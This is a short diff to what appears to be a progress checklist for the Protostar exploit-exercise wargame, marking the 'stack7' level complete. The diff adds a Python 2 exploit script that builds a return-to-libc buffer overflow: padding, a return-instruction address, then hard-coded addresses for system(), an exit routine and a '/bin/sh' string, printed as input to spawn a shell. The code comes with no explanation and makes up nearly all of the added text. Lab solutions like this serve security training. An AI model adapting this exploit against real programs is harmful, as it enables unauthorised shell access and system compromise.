@@ -8,7 +8,17 @@
 - [x] stack4
 - [x] stack5
 - [x] stack6
-- [ ] stack7
+- [x] stack7
+```
+import struct
+
+padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"
+return_op = struct.pack("I",0x08048544)
+call_system = struct.pack("I",0xb7ecffb0)
+after_system_execution = struct.pack("I",0xb7ec60c0)
+bin_sh_path = struct.pack("I",0xb7fb63bf)
+print padding + return_op + call_system + after_system_execution + bin_sh_path
+```
 
 ## Format String
 - [ ] format0
